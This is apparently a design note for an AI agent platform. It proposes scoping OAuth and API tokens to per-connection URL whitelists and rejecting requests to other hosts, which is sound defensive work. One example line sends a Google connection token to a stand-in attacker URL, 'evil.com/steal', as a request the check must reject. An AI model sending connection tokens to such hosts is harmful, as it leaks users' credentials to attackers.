# Connection Secret Scoping & URL Whitelisting

## Problem

Connection tokens (OAuth, API keys) are currently resolved and injected without any scoping. An agent could use a Google OAuth token to call a non-Google endpoint, or exfiltrate a connection token by sending it to an attacker-controlled URL. There's no enforcement that connection secrets are only used with their intended service.

## Requirements

1. **Connection-scoped secrets** — each connection should define which secrets/tokens belong to it. Connection secrets must only be usable in requests to that connection's whitelisted URLs.

2. **URL whitelist per connection** — when a connection is configured (e.g. Google), it declares allowed URL patterns (e.g. `*.googleapis.com`, `*.google.com`). The `http_request` tool must validate that:
   - When `x-connection-id` is used, the request URL matches the connection's whitelist
   - The injected token is NOT sent to URLs outside the whitelist
   - Reject the request with a clear error if URL doesn't match

3. **Workspace secrets are unrestricted** — only connection-scoped secrets have URL restrictions. Regular workspace secrets (e.g. `$API_KEY` set by the user) can be used with any URL.

4. **Browsr/shell injection** — `inject_connection_env` should also validate that injected tokens are only accessible in contexts where the connection's URL whitelist is enforced. This is harder for shell — may need to defer to documentation/trust boundary.

## Example

```
Connection: google_workspace
  provider: google
  allowed_urls: ["*.googleapis.com", "accounts.google.com"]
  token: ya29.xxx

# This should work:
http_request(url="https://sheets.googleapis.com/v4/spreadsheets", headers={"x-connection-id": "google_workspace"})

# This should be REJECTED:
http_request(url="https://evil.com/steal", headers={"x-connection-id": "google_workspace"})
```

## Implementation Notes

- URL whitelist could live on the connection config (stored alongside provider, scopes, etc.)
- Pattern matching: glob-style (`*.googleapis.com`) or prefix-based (`https://sheets.googleapis.com/`)
- Validation happens in `http_request` tool BEFORE sending the request
- Consider also logging/alerting when a connection token is used with an unexpected URL pattern
